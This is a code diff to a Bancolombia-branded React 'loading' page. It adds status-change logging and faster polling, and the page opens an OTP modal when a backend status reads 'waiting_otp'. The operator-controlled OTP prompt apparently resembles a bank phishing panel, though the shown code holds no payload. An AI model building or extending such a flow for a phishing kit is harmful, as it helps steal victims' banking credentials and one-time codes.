@@ -31,11 +31,16 @@ export default function BancolombiaCargandoPage() {
         
         if (data.success) {
           const newStatus = data.status;
-          console.log('📊 Current status:', newStatus);
+          console.log('📊 Polling - Current status:', newStatus, 'Time:', new Date().toLocaleTimeString());
+          
+          if (status !== newStatus) {
+            console.log('🔄 Status changed from', status, 'to', newStatus);
+          }
+          
           setStatus(newStatus);
 
           if (newStatus === 'waiting_otp') {
-            console.log('🔔 Opening OTP modal');
+            console.log('🔔 Status is waiting_otp - Opening OTP modal');
             setShowOtpModal(true);
           } else if (newStatus === 'admin_rejected') {
             console.log('❌ Payment rejected, redirecting');
@@ -47,7 +52,9 @@ export default function BancolombiaCargandoPage() {
       }
     };
 
-    const interval = setInterval(pollStatus, 2000);
+    // Poll immediately, then every second
+    pollStatus();
+    const interval = setInterval(pollStatus, 1000);
     return () => clearInterval(interval);
   }, [sessionId, router]);
 
